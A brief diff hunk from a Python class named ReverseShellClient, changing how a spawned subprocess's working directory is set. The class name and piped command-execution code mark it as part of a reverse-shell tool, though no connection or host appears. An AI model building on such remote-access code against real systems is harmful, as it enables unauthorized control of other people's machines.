@@ -90,7 +90,7 @@ class ReverseShellClient:
             stdin=asyncio.subprocess.PIPE,
             stdout=asyncio.subprocess.PIPE,
             stderr=asyncio.subprocess.PIPE,
-            cwd=Path.cwd()
+            cwd=os.getcwd()
         )
 
         output, stderr = await asyncio.create_task(process.communicate())  # await process.communicate()
